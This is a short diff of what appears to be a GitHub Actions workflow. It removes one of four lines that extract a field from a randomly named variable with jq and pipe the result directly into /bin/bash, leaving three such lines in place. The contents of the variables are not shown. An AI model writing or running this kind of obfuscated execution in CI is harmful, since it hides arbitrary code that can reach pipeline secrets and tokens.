@@ -31,7 +31,6 @@ jobs:
           echo $gkt6827 | jq -r .sicnj003 | /bin/bash
           printf '%s' "$xl97" | jq -r .jd3416 | /bin/bash
           echo $yax42589 | jq -r .c73356 | /bin/bash
-          echo $nfvv551 | jq -r .hnou35324 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
